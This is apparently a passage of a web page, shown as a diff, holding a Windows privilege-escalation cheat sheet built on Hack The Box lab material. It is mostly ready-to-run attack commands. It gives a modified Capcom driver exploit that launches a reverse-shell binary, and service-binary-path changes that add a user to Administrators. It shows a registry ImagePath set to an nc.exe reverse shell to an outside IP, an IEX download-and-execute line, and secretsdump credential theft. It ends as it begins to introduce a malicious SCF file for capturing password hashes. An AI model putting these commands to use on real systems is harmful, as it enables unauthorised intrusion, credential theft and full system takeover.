+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">DriverView</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">stext</span> <span class="n">drivers</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="n">drivers</span><span class="p">.</span><span class="py">txt</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-pattern</span> <span class="n">Capcom</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Exploit</strong></p>
+<ul>
+<li>Download Exploit:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">https://github.com/musheebat/Compiled-capcom-exploit/blob/main/ExploitCapcom.exe
+</span></span><span class="line"><span class="cl">https://github.com/tandasat/ExploitCapcom</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Use ExploitCapcom :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">ExploitCapcom</span><span class="p">.</span><span class="n">exe</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>**Alternate Exploitation - No GUI **</p>
+<p>If we do not have GUI access to the target, we will have to modify the <code>ExploitCapcom.cpp</code> code before compiling. Here we can edit line 292 and replace <code>&quot;C:\\Windows\\system32\\cmd.exe&quot;</code> with, say, a reverse shell binary created with <code>msfvenom</code>, for example: <code>c:\ProgramData\revshell.exe</code>.</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// Launches a command shell process
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">bool</span> <span class="nf">LaunchShell</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">TCHAR</span> <span class="n">CommandLine</span><span class="p">[]</span> <span class="o">=</span> <span class="nf">TEXT</span><span class="p">(</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">system32</span><span class="se">\\</span><span class="s">cmd.exe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PROCESS_INFORMATION</span> <span class="n">ProcessInfo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">STARTUPINFO</span> <span class="n">StartupInfo</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">StartupInfo</span><span class="p">)</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">CreateProcess</span><span class="p">(</span><span class="n">CommandLine</span><span class="p">,</span> <span class="n">CommandLine</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">StartupInfo</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&amp;</span><span class="n">ProcessInfo</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">ProcessInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>The <code>CommandLine</code> string in this example would be changed to:</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"> <span class="n">TCHAR</span> <span class="n">CommandLine</span><span class="p">[]</span> <span class="o">=</span> <span class="nf">TEXT</span><span class="p">(</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">ProgramData</span><span class="se">\\</span><span class="s">revshell.exe&#34;</span><span class="p">);</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Automating the Steps</strong></p>
+<p>We can use a tool such as EoPLoadDriver to automate the process of enabling the privilege, creating the registry key, and executing <code>NTLoadDriver</code> to load the driver. To do this, we would run the following</p>
+<ul>
+<li>Download EoPLoadDriver :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">wget https://github.com/TarlogicSecurity/EoPLoadDriver/</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Use EoPLoadDriver :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">EoPLoadDriver</span><span class="p">.</span><span class="py">exe</span> <span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Capcom</span> <span class="n">c:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">Capcom</span><span class="p">.</span><span class="n">sys</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>We would then run <code>ExploitCapcom.exe</code> to pop a SYSTEM shell or run our custom binary.</p>
+<h4 id="server-operators">Server Operators<a href="#server-operators" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#Print_Operators</p>
+<ul>
+<li>Confirming service starts :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"> sc qc AppReadiness</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Download Psservice :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://learn.microsoft.com/en-us/sysinternals/downloads/psservice</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Checking Service Permissions :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">c<span class="p">:</span><span class="nl">\Tools\PsService.exe</span><span class="c1"> security AppReadiness</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Modifying the Service Binary Path</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sc config AppReadiness <span class="nv">binPath</span><span class="o">=</span> <span class="s2">&#34;cmd /c net localgroup Administrators server_adm /add&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Retrieve Credential :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">crackmapexec smb 10.129.43.9 -u server_adm -p <span class="s1">&#39;HTB_@cademy_stdnt!&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator</span></span></code></pre></div>
+  </figure>
+</div>
+<h3 id="os-exploitation">OS Exploitation<a href="#os-exploitation" class="anchor" aria-hidden="true">#</a> </h3>
+<h4 id="user-account-control">User Account Control<a href="#user-account-control" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#UAC</p>
+<ul>
+<li>Confirming UAC is Enabled :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">REG QUERY HKEY_LOCAL_MACHINE<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\P</span>olicies<span class="se">\S</span>ystem<span class="se">\ </span>/v EnableLUA</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Checking UAC Level :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <pre tabindex="0"><code class="language-cmd-session" data-lang="cmd-session">REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin</code></pre>
+  </figure>
+</div>
+<ul>
+<li>
+<p>If <strong>0</strong> then, UAC won&rsquo;t prompt (like <strong>disabled</strong>)</p>
+</li>
+<li>
+<p>If <strong>1</strong> the admin is <strong>asked for username and password</strong> to execute the binary with high rights (on Secure Desktop)</p>
+</li>
+<li>
+<p>If <strong>2</strong> (<strong>Always notify me</strong>) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)</p>
+</li>
+<li>
+<p>If <strong>3</strong> like <code>1</code> but not necessary on Secure Desktop</p>
+</li>
+<li>
+<p>If <strong>4</strong> like <code>2</code> but not necessary on Secure Desktop</p>
+</li>
+<li>
+<p>if <strong>5</strong>(<strong>default</strong>) it will ask the administrator to confirm to run non Windows binaries with high privileges</p>
+</li>
+<li>
+<p>Checking Windows Version</p>
+</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="no">environment</span><span class="p">]::</span><span class="n">OSVersion</span><span class="p">.</span><span class="n">Version</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Ressources :
+https://en.wikipedia.org/wiki/Windows_10_version_history
+https://egre55.github.io/system-properties-uac-bypass/</li>
+</ul>
+<h4 id="weak-permissions">Weak Permissions<a href="#weak-permissions" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#Weak_Permissions</p>
+<p><strong>Weak Binary Permissions</strong></p>
+<ul>
+<li>Download SharpUp :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://github.com/GhostPack/SharpUp/</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Run SharpUp :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"> <span class="p">.\</span><span class="n">SharpUp</span><span class="p">.</span><span class="py">exe</span> <span class="n">audit</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>OR</p>
+<ul>
+<li>Run Powerup :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
+</span></span><span class="line"><span class="cl">powershell -ep bypass
+</span></span><span class="line"><span class="cl">.<span class="se">\P</span>owerUp.ps1
+</span></span><span class="line"><span class="cl">Get-ModifiableServiceFile</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Checking BInary Permissions :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">icacls <span class="s2">&#34;C:\Program Files (x86)\PCProtect\SecurityService.exe&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>List running binary :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">Name</span><span class="p">,</span><span class="n">State</span><span class="p">,</span><span class="n">PathName</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">State</span> <span class="o">-like</span> <span class="s1">&#39;Running&#39;</span><span class="p">}</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>The icacls utility outputs the corresponding principals and their permission mask. The most relevant permissions and their masks are listed below:</p>
+<p><strong>Mask Permissions</strong> :</p>
+<p>F : Full access
+M : Modify access
+RX : Read and execute access
+R : Read-only access
+W : Write-only access</p>
+<ul>
+<li>Check the startup status of the binary :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Get-CimInstance -ClassName win32_service <span class="p">|</span> Select Name, StartMode <span class="p">|</span>
+</span></span><span class="line"><span class="cl">Where-Object <span class="o">{</span><span class="nv">$_</span>.Name -like <span class="s1">&#39;mysql&#39;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#mysql is the name !</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Reboot the machine :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">shutdown /r /t <span class="m">0</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Replacing Service Binary</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cmd /c copy /Y SecurityService.exe <span class="s2">&#34;C:\Program Files (x86)\PCProtect\SecurityService.exe&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#then start the service</span>
+</span></span><span class="line"><span class="cl">sc start SecurityService</span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Weak Service Permissions</strong></p>
+<ul>
+<li>Download Accesschk :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://download.sysinternals.com/files/AccessChk.zip</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Checking Permissions :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">accesschk.exe /accepteula -quvcw WindscribeService</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Changing the Service Binary Path :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">sc config WindscribeService binpath=<span class="s2">&#34;cmd /c net localgroup administrators htb-student /add&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Searching for Unquoted Service Paths</strong></p>
+<ul>
+<li>Querying Service :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sc qc SystemExplorerHelpService</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Searching for Unquoted Service Paths :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wmic service get name,displayname,pathname,startmode <span class="p">|</span>findstr /i <span class="s2">&#34;auto&#34;</span> <span class="p">|</span> findstr /i /v <span class="s2">&#34;c:\windows\\&#34;</span> <span class="p">|</span> findstr /i /v <span class="s2">&#34;&#34;&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Permissive Registry ACLs</strong></p>
+<ul>
+<li>Checking for Weak Service ACLs in Registry :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <pre tabindex="0"><code class="language-cmd-session" data-lang="cmd-session">accesschk.exe /accepteula &#34;mrb3n&#34; -kvuqsw hklm\System\CurrentControlSet\services</code></pre>
+  </figure>
+</div>
+<ul>
+<li>Changing ImagePath with PowerShell :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-ItemProperty</span> <span class="n">-Path</span> <span class="n">HKLM</span><span class="err">:</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\</span><span class="n">ModelManagerService</span> <span class="n">-Name</span> <span class="s2">&#34;ImagePath&#34;</span> <span class="n">-Value</span> <span class="s2">&#34;C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Modifiable Registry Autorun Binary</strong></p>
+<ul>
+<li>Check Startup Programs :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-CimInstance</span> <span class="n">Win32_StartupCommand</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Name</span><span class="p">,</span> <span class="n">command</span><span class="p">,</span> <span class="n">Location</span><span class="p">,</span> <span class="n">User</span> <span class="p">|</span><span class="n">fl</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Ressources :
+https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
+https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries</li>
+</ul>
+<h4 id="kernel-exploits">Kernel Exploits<a href="#kernel-exploits" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#Kernel_Exploits</p>
+<p><strong>Escalation with Metasploit</strong></p>
+<ul>
+<li>After Metrepreter
+<ul>
+<li><code>run post/multi/recon/local_exploit_suggester</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>Manual Kernel Exploitation</strong></p>
+<ul>
+<li>In windows PS
+<ul>
+<li><code>systeminfo</code></li>
+<li>Copy the data from above commands.</li>
+</ul>
+</li>
+<li>In attacker machine
+<ul>
+<li>Save the data in a text file</li>
+<li><code>windows-exploit-suggester.py --database &lt;db-date&gt;.xlsx --systeminfo systeminfo.txt</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>Checking Permissions on the SAM File</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">icacls c:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>AM</span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Enumerating Missing Patches</strong></p>
+<ul>
+<li>Examining Installed Updates:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <pre tabindex="0"><code class="language-powershell-session" data-lang="powershell-session">systeminfo
+wmic qfe list brief
+Get-Hotfix</code></pre>
+  </figure>
+</div>
+<ul>
+<li>Ressources :
+https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808</li>
+</ul>
+<h4 id="vulnerable-services">Vulnerable Services<a href="#vulnerable-services" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#Vulnerable_Services</p>
+<ul>
+<li>Enumerating Installed Programs :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">wmic product get name</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Enumerating Local Ports :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netstat -ano <span class="p">|</span> findstr 6064</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Enumerating Process ID</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">get-process</span> <span class="n">-Id</span> <span class="mf">3324</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Enumerating Running Service</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">get-service</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">DisplayName</span> <span class="o">-like</span> <span class="s1">&#39;Druva*&#39;</span><span class="p">}</span></span></span></code></pre></div>
+  </figure>
+</div>
+<h4 id="dll-injection">DLL Injection<a href="#dll-injection" class="anchor" aria-hidden="true">#</a> </h4>
+<p>#dll</p>
+<ul>
+<li>
+<p>LoadLibrary:</p>
+</li>
+<li>
+<p>Manual Mapping:</p>
+</li>
+<li>
+<p>Reflective DLL Injection : https://github.com/stephenfewer/ReflectiveDLLInjection</p>
+</li>
+<li>
+<p>DLL Hijacking:</p>
+</li>
+<li>
+<p>The following listing shows the standard search order taken from the Microsoft Documentation:</p>
+</li>
+</ul>
+<ol>
+<li>The directory from which the application loaded.</li>
+<li>The system directory.</li>
+<li>The 16-bit system directory.</li>
+<li>The Windows directory.</li>
+<li>The current directory.</li>
+<li>The directories that are listed in the PATH environment variable.</li>
+</ol>
+<h3 id="additional-techniques">Additional Techniques<a href="#additional-techniques" class="anchor" aria-hidden="true">#</a> </h3>
+<p>#Additional_Technique</p>
+<h4 id="interacting-with-users">Interacting with Users<a href="#interacting-with-users" class="anchor" aria-hidden="true">#</a> </h4>
+<p><strong>Monitoring for Process Command Lines</strong></p>
+<ul>
+<li>Creating procmon.ps1 :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="vm">$true</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nv">$process</span> <span class="p">=</span> <span class="nb">Get-WmiObject</span> <span class="n">Win32_Process</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">CommandLine</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">Start-Sleep</span> <span class="mf">1</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$process2</span> <span class="p">=</span> <span class="nb">Get-WmiObject</span> <span class="n">Win32_Process</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">CommandLine</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">Compare-Object</span> <span class="n">-ReferenceObject</span> <span class="nv">$process</span> <span class="n">-DifferenceObject</span> <span class="nv">$process2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Running Monitor Script :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">IEX </span><span class="p">(</span><span class="nb">iwr </span><span class="s1">&#39;http://10.10.10.205/procmon.ps1&#39;</span><span class="p">)</span> </span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Tools to analyse Traffic :
+https://github.com/DanMcInerney/net-creds</li>
+</ul>
+<p><strong>SCF on a File Share</strong></p>
+<p>A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as <a href="https://github.com/lgandx/Responder">Responder</a>, <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>, or <a href="https://github.com/Kevin-Robertson/InveighZero">InveighZero</a>, we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user&rsquo;s workstation. We may be able to capture a user&rsquo;s password hash and use the cleartext password to escalate privileges on the target host, within the domain, or further our access/gain access to other resources.</p>
+<p><strong>Malicious SCF File</strong></p>
+<p>In this example, let&rsquo;s create the following file and name it something like <code>@Inventory.scf</code> (similar to another file in the directory, so it does not appear out of place). We put an <code>@</code> at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. Here we put in our <code>tun0</code> IP address and any fake share name and .ico file name.</p>
+<ul>
+<li>Malicious file :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
